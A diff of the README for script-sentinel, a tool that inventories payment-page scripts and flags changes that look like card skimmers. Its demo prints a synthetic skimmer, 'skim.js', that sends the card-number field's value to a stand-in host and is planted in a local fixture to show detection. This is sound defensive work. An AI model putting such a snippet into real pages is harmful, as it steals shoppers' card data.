@@ -12,14 +12,16 @@ code runs on your checkout page with your users' trust. script-sentinel keeps an
 every script your pages load, pins what each one should look like, and tells you when one
 changes and whether the change looks like a skimmer.
 
-> **Status: in active development (day 4 of 14).** Scans fetch your pages, inventory every
+> **Status: in active development (day 5 of 14).** Scans fetch your pages, inventory every
 > script they load, download and hash every script body, keep a version history per script,
 > check `integrity` attributes the way a browser does, and snapshot each page's security
 > headers. Every script is approved (with a written justification), rejected or pending,
 > by hand or through origin, prefix and hash policies, and a vendor change sends a pinned
-> script back to review. Every decision and status change lands in a hash-chained audit
-> trail. See [docs/PLAN.md](docs/PLAN.md) for the roadmap and
-> [docs/PROGRESS.md](docs/PROGRESS.md) for the daily log.
+> script back to review. Each scan compares every script with what it served last time:
+> new scripts and changed bodies become findings with a severity and a JS-aware token
+> diff that names the hosts the new code talks to. Decisions, status changes and the
+> handling of findings land in a hash-chained audit trail. See [docs/PLAN.md](docs/PLAN.md)
+> for the roadmap and [docs/PROGRESS.md](docs/PROGRESS.md) for the daily log.
 
 ## Why
 
@@ -46,7 +48,8 @@ changes and whether the change looks like a skimmer.
 | Headers (11.6.1) | CSP, CSP-Report-Only, Integrity-Policy, HSTS, `X-Content-Type-Options` and other security headers, plus `<meta>` CSPs, snapshotted per page per scan | ✅ day 3 |
 | Authorization (6.4.3) | Approve (pinned to the current bodies, or for any version) or reject each script with a written justification; origin, URL-prefix and hash policies, either pinned on first use or "expected to change"; cache-busting query parameters folded into one script; `scan run --fail-on-unauthorized` gates a pipeline on payment pages | ✅ day 4 |
 | Audit trail | Every decision, policy change and status change, append-only and SHA-256 hash-chained per site, with a verifier that finds the first edited, removed or reordered event | ✅ day 4 |
-| Change review | JS-aware tokenized diff, size and entropy deltas, newly referenced domains | day 5 |
+| Change review | Every scan compares each script with what it served last time; a changed body (including going back to an old one) or a script new to an already-scanned page becomes a finding with a severity: a token diff that ignores comments and whitespace and stays fast on minified bundles, size and entropy deltas, and the hosts and URLs the new code references; inline blocks are matched by content, so inserting one doesn't shift the others | ✅ day 5 |
+| Findings | Open, acknowledged or resolved (with a note), each step in the audit trail; `scan run --fail-on SEVERITY` gates a pipeline; `scripts diff` compares any two versions | ✅ day 5 |
 | Skimmer heuristics | New exfiltration sinks, card-field listeners, wallet-address swaps, obfuscation, script injection | day 6 |
 | CSP reports | `report-uri` and Reporting API collector with dedupe, rate limits, batch ingest and optional Kafka | days 7–8 |
 | CSP builder | Policy suggestions from the approved inventory and observed reports | day 9 |
@@ -67,8 +70,10 @@ flowchart LR
     scanner --> store[("PostgreSQL<br/>sites · pages · scripts<br/>versions · findings")]
     scanner --> policy["Authorization<br/>decisions · policies"]
     policy --> trail[("Audit trail<br/>hash-chained")]
-    policy --> diff["Diff + heuristics"]
-    diff --> findings["Findings"] --> outbox["Outbox"] --> hooks["Signed webhooks"]
+    scanner --> diff["Change detection<br/>token diff · hosts · severity"]
+    diff --> findings["Findings"] --> outbox["Outbox<br/>(day 10)"] --> hooks["Signed webhooks"]
+    findings --> trail
+    heur["Skimmer heuristics<br/>(day 6)"] -.-> diff
     sites --> store
     csp --> ingest["Buffered ingest<br/>(memory or Kafka)"] --> store
 ```
@@ -94,6 +99,8 @@ erDiagram
     SITE ||--o{ POLICY : "authorizes with"
     POLICY |o--o{ SCRIPT : "approved by"
     SITE ||--o{ AUTHORIZATION_EVENT : "audit trail"
+    SCAN |o--o{ FINDING : raised
+    SCRIPT_VERSION |o--o{ FINDING : "new body / previous body"
     SITE {
         uuid id
         string name
@@ -110,6 +117,7 @@ erDiagram
         int scripts_new
         int scripts_changed
         int scripts_pending "after authorization"
+        int findings_new
     }
     PAGE_SNAPSHOT {
         enum outcome "ok | robots_disallowed | http_error | ..."
@@ -172,10 +180,13 @@ erDiagram
         string hash "sha256 of the event"
     }
     FINDING {
-        string kind
-        enum severity
+        string kind "script.added | script.changed | script.reformatted"
+        enum severity "info | low | medium | high | critical"
         enum status "open | acknowledged | resolved"
-        json detail
+        string locator "kept if the script is deleted"
+        json detail "reasons, diff, size/entropy, new hosts and URLs"
+        string status_changed_by
+        text status_note
     }
 ```
 
@@ -209,7 +220,7 @@ Design notes:
   meaningful), so a rebuild that only changed a banner comment or `sourceMappingURL` can be
   told apart from a change in the code. The tokenizer handles strings, template literals
   with nested substitutions, regex-versus-division and unterminated input, and is the base
-  for day 5's token diff.
+  for the token diff.
 - **Integrity checked like a browser.** Only the strongest algorithm in an `integrity`
   attribute counts (`sha256-<good> sha384-<bad>` fails), unusable values mean the script
   runs unchecked (reported as `no_supported_hash`), and digests are compared exactly. SRI
@@ -248,6 +259,26 @@ Design notes:
 - **Scans record what was authorized at the time.** Each script observation keeps its
   status as of the end of that scan, so old scans stay accurate evidence after later
   decisions.
+- **A change is measured against the last scan, not against history.** Each script keeps
+  the bodies it served on its last successful fetch; a scan reports any body outside that
+  set, so a vendor that flips back to an old build is reported too (as `low`, "went back to
+  an earlier body"). Each new body is diffed against the closest previous one (same
+  normalized hash first, then the most similar).
+- **A token diff that stays bounded.** Common prefixes and suffixes are trimmed first;
+  small middles go to `difflib` token by token, large ones get a patience diff anchored on
+  tokens that occur once on each side, with a work budget. Past the budget the rest is
+  reported as whole replacements and the result is marked `coarse`. In one local
+  measurement, a 1.4 MB synthetic bundle with two edits was analyzed in about 2 s, and a
+  fully shuffled copy in about 2.4 s; a statement-level `difflib` alignment tried first
+  didn't finish that one within 100 s.
+- **New hosts, not just new code.** URLs in string and template literals are extracted
+  (escapes like `\/` and `\x2f` undone, protocol-relative `//host` included), and a body
+  that references a host its previous version didn't is `high` severity. URLs built at
+  runtime are the skimmer heuristics' job (day 6).
+- **Inline identity follows content.** Inline blocks are matched against the page's known
+  blocks by exact body, normalized body, token similarity (at least 0.6) and only then by
+  position, so a new snippet in front of the others is one new script instead of every
+  block after it "changing".
 - **Findings outlive the scripts they're about.** Deleting a script sets the reference on its
   findings to `NULL` instead of deleting them; they are audit evidence.
 - **Portable schema.** Enums are `VARCHAR` + `CHECK`, JSON is `JSONB` on PostgreSQL, and
@@ -397,7 +428,7 @@ Now play the vendor: the analytics tag on the CDN changes, with no deploy on the
 ```console
 $ echo 'queue.push(["ping"]);' >> examples/fixture-cdn/analytics/v2/tag.js
 $ uv run sentinel scan run demo --fail-on-unauthorized
-scan 1dcaac2b-b456-4258-a5ec-bf2d51f4469c of demo: completed in 0.08s (2 pages: 2 ok)
+scan 95e29288-b46a-4ec5-8f13-dd8e13db0a48 of demo: completed in 0.08s (2 pages: 2 ok)
   ok       http://127.0.0.1:8000/checkout.html [payment]  200  6 scripts
       headers: CSP report-only, nosniff, Referrer-Policy
         http://127.0.0.1:8000/checkout.html#inline-1  (classic, approved, nonce)  sha384-lXDOInm1aF5PqqU…
@@ -415,39 +446,147 @@ inventory: 7 scripts seen, 0 new
 authorization: 6 approved, 1 pending, 0 rejected
 bodies: 4 external fetched, 0 failed; 1 new versions, 1 scripts changed
 warning: payment pages run 1 scripts that are not approved (PCI DSS 6.4.3); review them with: sentinel scripts list demo
+findings: 1 (review with: sentinel findings show ID)
+  MEDIUM   0fa6fe9a-2b42-4920-886b-1ebf64448621  Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
+           the code changed; runs on a payment page
 $ echo $?
 4
 $ uv run sentinel scripts show demo http://127.0.0.1:8001/analytics/v2/tag.js
 http://127.0.0.1:8001/analytics/v2/tag.js
   kind: external   status: pending
   why: the body changed since prefix policy http://127.0.0.1:8001/analytics/ pinned it
-  seen: 2026-11-24 10:14:41Z .. 2026-11-24 10:15:05Z
+  seen: 2026-11-25 10:30:13Z .. 2026-11-25 10:30:19Z
   versions (2, most recently seen first):
-    2026-11-24 10:15:05Z       231 bytes  sha384-5R5tM2xxeboPVK+WaFsUzTA2YwHEgRK/wn7ptQQByydFrdEChhOQ1FYewCG6Zj52
-    2026-11-24 10:15:04Z       209 bytes  sha384-raygKpbLnYdKgM3/yZTB+rNJEmEUx75tgDCpLy3OMpv6OlnikQK3g4yXoPd2vFCD  approved by policy:037b1087-f17d-4053-8267-b0f8d7d994fa
+    2026-11-25 10:30:19Z       231 bytes  sha384-5R5tM2xxeboPVK+WaFsUzTA2YwHEgRK/wn7ptQQByydFrdEChhOQ1FYewCG6Zj52
+    2026-11-25 10:30:18Z       209 bytes  sha384-raygKpbLnYdKgM3/yZTB+rNJEmEUx75tgDCpLy3OMpv6OlnikQK3g4yXoPd2vFCD  approved by policy:230e9caf-d6aa-49b2-84ee-a7820fa983ae
   pin the current body with:
     <script src="http://127.0.0.1:8001/analytics/v2/tag.js" integrity="sha384-5R5tM2xxeboPVK+WaFsUzTA2YwHEgRK/wn7ptQQByydFrdEChhOQ1FYewCG6Zj52" crossorigin="anonymous"></script>
 $ uv run sentinel audit list demo --script http://127.0.0.1:8001/analytics/v2/tag.js
-#17   2026-11-24 10:15:05Z  script.status_changed scan             approved -> pending   http://127.0.0.1:8001/analytics/v2/tag.js
+#17   2026-11-25 10:30:19Z  script.status_changed scan             approved -> pending   http://127.0.0.1:8001/analytics/v2/tag.js
       the body changed since prefix policy http://127.0.0.1:8001/analytics/ pinned it
-#13   2026-11-24 10:14:53Z  script.status_changed zeeshan          pending -> approved   http://127.0.0.1:8001/analytics/v2/tag.js
+#13   2026-11-25 10:30:16Z  script.status_changed zeeshan          pending -> approved   http://127.0.0.1:8001/analytics/v2/tag.js
       approved by prefix policy http://127.0.0.1:8001/analytics/, pinned to the first body seen
-#3    2026-11-24 10:14:41Z  script.status_changed scan             new -> pending        http://127.0.0.1:8001/analytics/v2/tag.js
+#3    2026-11-25 10:30:13Z  script.status_changed scan             new -> pending        http://127.0.0.1:8001/analytics/v2/tag.js
       no decision or policy covers this script yet
 $ uv run sentinel audit verify demo
-audit trail of demo is intact: 17 events, head cca18508f36ae7be88031db77d8fd47f1ddc3d33268d6c7f698ca9d660ac5f78
+audit trail of demo is intact: 17 events, head d3787f6481354293c27763f3340f3c1242fa51d36b98c97775b6b2c05020e0af
 $ uv run sentinel scripts show demo 'http://127.0.0.1:8000/checkout.html#inline-1' | tail -1
   CSP hash source for the current body: 'sha384-lXDOInm1aF5PqqUrDg5CaId7/zhFcRp49CafOH2uDqHBYq9Cjkh80E/lvWCymFNd'
-$ git checkout -- examples/fixture-cdn    # put the fixture back
 ```
 
 `~` marks a script whose body changed: same script, new version. The prefix policy pinned
 the first body, so the new one is `pending` until someone looks at it (approving it again,
 or `--any-version` if the vendor is trusted to change it), and the scan fails the gate.
-Judging *what* changed is the job of the diff and skimmer heuristics (days 5 and 6).
-`sentinel scan run` also exits 3 when any page could not be inventoried; `--json` prints
-the whole scan, including each page's security headers, every script fetch and each
-script's authorization status.
+The change is also a finding: `low` for a code change, raised to `medium` because the tag
+runs on a payment page. `sentinel scan run` also exits 3 when any page could not be
+inventoried; `--json` prints the whole scan, including each page's security headers, every
+script fetch, each script's authorization status and the findings.
+
+### Review a change
+
+Now the vendor is compromised, and the tag starts sending card numbers to a host it never
+talked to before. `skim.js` is a synthetic stand-in:
+
+```js
+document.addEventListener("change", function (e) {
+  if (e.target.name === "cardnumber") navigator.sendBeacon("https://collect.example-cdn.test/c", e.target.value);
+});
+```
+
+The finding says what changed, where it runs and why it is `critical`, and shows the
+tokens that were added:
+
+```console
+$ cat skim.js >> examples/fixture-cdn/analytics/v2/tag.js    # the vendor is compromised
+$ uv run sentinel scan run demo --fail-on high
+…
+findings: 1 (review with: sentinel findings show ID)
+  CRITICAL ee5833e7-145d-4ddd-8ba7-a784583d2029  Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
+           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
+$ echo $?
+5
+$ uv run sentinel findings show ee5833e7-145d-4ddd-8ba7-a784583d2029
+finding ee5833e7-145d-4ddd-8ba7-a784583d2029 (demo): script.changed, open
+  CRITICAL Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
+           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
+  pages [payment]: http://127.0.0.1:8000/checkout.html, http://127.0.0.1:8000/index.html
+  size: 231 -> 400 bytes (+169)   entropy: 5.02 -> 5.02 bits/char (+0.00)
+  tokens: -0 +37 of 56 -> 93 (similarity 75%)
+  new hosts: collect.example-cdn.test
+  new URLs: https://collect.example-cdn.test/c
+@@ line 7 -> line 7 @@
+  … ( [ "ping" ] ) ;
++ document . addEventListener ( "change" , function ( e ) {
++ if ( e . target . name === "cardnumber" ) navigator . sendBeacon ( "https://collect.example-cdn.test/c" , e . target . value ) ;
++ } ) ;
+$ uv run sentinel scripts diff demo http://127.0.0.1:8001/analytics/v2/tag.js --from sha384-raygKpbL
+http://127.0.0.1:8001/analytics/v2/tag.js
+  from sha384-raygKpbLnYdKgM3/yZTB+rNJEmEUx75tgDCpLy3OMpv6OlnikQK3g4yXoPd2vFCD  (first seen 2026-11-25 10:30Z)
+  to   sha384-C9HItuTAqj2KTcNQcbdVkXaXTUx7KHGGC86Sxg8TlFAWrJYYGK9JNwE5f/abopwL  (first seen 2026-11-25 10:30Z)
+  size: 209 -> 400 bytes (+191)   entropy: 4.99 -> 5.02 bits/char (+0.03)
+  tokens: -0 +46 of 47 -> 93 (similarity 67%)
+  new hosts: collect.example-cdn.test
+  new URLs: https://collect.example-cdn.test/c
+@@ line 6 -> line 6 @@
+  … ( window , document ) ;
++ queue . push ( [ "ping" ] ) ;
++ document . addEventListener ( "change" , function ( e ) {
++ if ( e . target . name === "cardnumber" ) navigator . sendBeacon ( "https://collect.example-cdn.test/c" , e . target . value ) ;
++ } ) ;
+$ uv run sentinel findings ack ee5833e7-145d-4ddd-8ba7-a784583d2029
+finding ee5833e7-145d-4ddd-8ba7-a784583d2029 is now acknowledged
+$ uv run sentinel findings resolve ee5833e7-145d-4ddd-8ba7-a784583d2029
+error: resolving a finding needs a note saying what was done
+$ uv run sentinel findings resolve ee5833e7-145d-4ddd-8ba7-a784583d2029 -n "Vendor compromise: tag removed from checkout, vendor notified"
+finding ee5833e7-145d-4ddd-8ba7-a784583d2029 is now resolved
+$ uv run sentinel findings list demo
+2026-11-25 10:30:23Z  resolved     ee5833e7-145d-4ddd-8ba7-a784583d2029
+  CRITICAL Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
+           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
+2026-11-25 10:30:19Z  open         0fa6fe9a-2b42-4920-886b-1ebf64448621
+  MEDIUM   Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
+           the code changed; runs on a payment page
+$ uv run sentinel audit list demo --limit 2
+#19   2026-11-25 10:30:26Z  finding.resolved      zeeshan          acknowledged -> resolved http://127.0.0.1:8001/analytics/v2/tag.js
+      Vendor compromise: tag removed from checkout, vendor notified
+#18   2026-11-25 10:30:25Z  finding.acknowledged  zeeshan          open -> acknowledged  http://127.0.0.1:8001/analytics/v2/tag.js
+```
+
+The diff works on JavaScript tokens, so a 300 KB one-line bundle diffs down to the tokens
+that changed, and comment or whitespace-only rebuilds are reported as `script.reformatted`
+(`info`) rather than changes. Severity starts at `low` for a code change, goes to `medium`
+when the script grows by more than half or its entropy jumps (packing and obfuscation do
+both), to `high` when it references a host the previous body didn't, and one level up on a
+payment page. `--fail-on high` exits 5 when the scan raised anything that severe; it wins
+over `--fail-on-unauthorized` (4) and an incomplete scan (3). Resolving a finding needs a
+note, and every step lands in the audit trail next to the authorization events.
+
+Inline scripts have no URL, so they are identified by page and position. To keep that
+stable, a scan first matches each inline block with the page's known blocks by exact body,
+then by normalized body, then by token similarity, and only then by position. Adding an
+A/B-test snippet in front of the checkout's config makes one new script, not three changed
+ones:
+
+```console
+$ # an A/B-test snippet is added in front of the checkout's inline config
+$ uv run sentinel scan run demo
+scan d22b1a0e-dfdb-44a2-ac96-1d44dee70cdb of demo: completed in 0.07s (2 pages: 2 ok)
+  ok       http://127.0.0.1:8000/checkout.html [payment]  200  7 scripts (1 new)
+      headers: CSP report-only, nosniff, Referrer-Policy
+      + http://127.0.0.1:8000/checkout.html#inline-3  (classic, pending)  sha384-FX8LLUZipr6QjrK…
+        http://127.0.0.1:8000/checkout.html#inline-1  (classic, approved, nonce)  sha384-lXDOInm1aF5PqqU…
+        http://127.0.0.1:8000/checkout.html#inline-2  (importmap, approved)  sha384-RK3hVJoVsFjKTgJ…
+…
+findings: 1 (review with: sentinel findings show ID)
+  MEDIUM   4edbb921-7db9-4ccb-9dbe-727e59676e2a  New inline script on a payment page: http://127.0.0.1:8000/checkout.html#inline-3
+           a new inline script; runs on a payment page
+$ git checkout -- examples    # put the fixtures back
+```
+
+A script that appears on a page an earlier scan already inventoried is a finding (`low`
+inline, `medium` external, `high` from a host no other script of the site uses, one level
+up on a payment page). A page's first successful scan is its baseline, so registering a
+new page doesn't flood the findings.
 
 (Output from a real run against PostgreSQL 16.)
 
@@ -517,7 +656,7 @@ $ curl -s localhost:8080/v1/sites/demo/audit/verify | jq .
 | `POST` | `/v1/sites/{name}/pages` | Register a page (`422` if it's off the allowlist) |
 | `GET` | `/v1/sites/{name}/pages` | List pages |
 | `DELETE` | `/v1/sites/{name}/pages?url=…` | Stop scanning a page |
-| `POST` | `/v1/sites/{name}/scans` | Scan every page now; returns the scan with each page's snapshot and scripts (`422` if the site has no pages) |
+| `POST` | `/v1/sites/{name}/scans` | Scan every page now; returns the scan with each page's snapshot and scripts and the findings it raised (`422` if the site has no pages) |
 | `GET` | `/v1/sites/{name}/scans?limit=20` | Recent scans, newest first |
 | `GET` | `/v1/scans/{id}` | One scan with its snapshots and script observations |
 | `GET` | `/v1/sites/{name}/scripts` | The site's script inventory with authorization status, version count and current SRI value |
@@ -531,11 +670,17 @@ $ curl -s localhost:8080/v1/sites/demo/audit/verify | jq .
 | `DELETE` | `/v1/sites/{name}/policies/{id}?actor=…&reason=…` | Remove a policy; returns the scripts whose status changed |
 | `GET` | `/v1/sites/{name}/audit?script_id=…&limit=100` | The audit trail, newest first |
 | `GET` | `/v1/sites/{name}/audit/verify` | Recompute the hash chain: `ok`, events verified, head hash, first bad event |
+| `GET` | `/v1/sites/{name}/findings?status=…&min_severity=…&scan_id=…&script_id=…&limit=50` | Findings, newest first |
+| `GET` | `/v1/findings/{id}` | One finding with its evidence (reasons, pages, diff hunks, size and entropy, new hosts and URLs) |
+| `POST` | `/v1/findings/{id}/acknowledge` | Acknowledge (`actor`, optional `note`); audited |
+| `POST` | `/v1/findings/{id}/resolve` | Resolve (`actor`, `note` required); audited |
+| `POST` | `/v1/findings/{id}/reopen` | Reopen (`actor`, optional `note`); audited |
+| `GET` | `/v1/sites/{name}/scripts/{id}/diff?from=…&to=…&max_hunks=200` | Token diff between two versions (id, hex SHA-384 prefix or SRI prefix); defaults to the latest two |
 
-`PATCH /v1/sites/{name}` also accepts `respect_robots`. The `actor` on authorization
-requests is recorded as given: the API has no authentication yet (day 13 adds it), so run
-it on a trusted network until then. A scan through the API runs inside
-the request for now; scheduled background scans arrive with the worker on day 10.
+`PATCH /v1/sites/{name}` also accepts `respect_robots`. The `actor` on authorization and
+finding requests is recorded as given: the API has no authentication yet (day 13 adds it),
+so run it on a trusted network until then. A scan through the API runs inside the request
+for now; scheduled background scans arrive with the worker on day 10.
 
 ## Configuration
 
@@ -576,7 +721,10 @@ for timeouts, oversized bodies, odd redirects and broken servers. No test touche
 internet. CI also authorizes the fixture inventory with policies and approvals, checks
 that the payment-page gate passes, changes a vendor script in the fixture CDN, and checks
 that it is recorded as a new version of the same script, sent back to review, fails the
-gate and leaves an intact audit trail.
+gate and leaves an intact audit trail. Then it plants a synthetic skimmer in the vendor
+script and checks for a `critical` finding with the new host in its diff, exit code 5 from
+`--fail-on high`, the audited ack/resolve flow, and that an inline block inserted in front
+of the others is one new script.
 
 ## Project layout
 
@@ -596,7 +744,11 @@ src/script_sentinel/
   headers.py        captures a page's security-relevant response headers
   jstokens.py       JavaScript tokenizer and the normalized form used for hashing
   sri.py            Subresource Integrity values and browser-style checks
-  versions.py       body hashing and per-script version history
+  versions.py       body hashing, per-script version history and version diffs
+  diff.py           token diff (difflib for small changes, budgeted patience diff for big ones)
+  changes.py        change analysis (size, entropy, referenced hosts), severity rules,
+                    inline block matching
+  findings.py       raising findings after a scan; acknowledge, resolve, reopen
   scanner.py        runs a scan and records snapshots, fetches, versions and the inventory
   authorization.py  decisions, policies and the rules that derive each script's status
   audit.py          the hash-chained, append-only authorization audit trail
